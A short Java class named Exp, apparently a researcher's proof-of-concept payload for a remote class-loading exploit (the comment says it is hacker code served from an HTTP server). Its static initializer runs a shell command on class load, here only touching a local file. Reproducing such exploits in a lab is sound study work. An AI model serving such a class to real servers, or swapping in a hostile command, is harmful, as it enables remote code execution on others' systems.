package test;

/**
 * @auther youhuan
 * @create 2021-12-11 17:52
 * 部署在http服务器上的问题黑客代码
 */
public class Exp
{
    static
    {
        try
        {
            String[] cmd={"/usr/bin/touch", "/Users/youhuan/develop/tmpfile/yh.txt"};
            System.out.println("-----啦啦啦。。。。");
            Runtime.getRuntime().exec(cmd).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
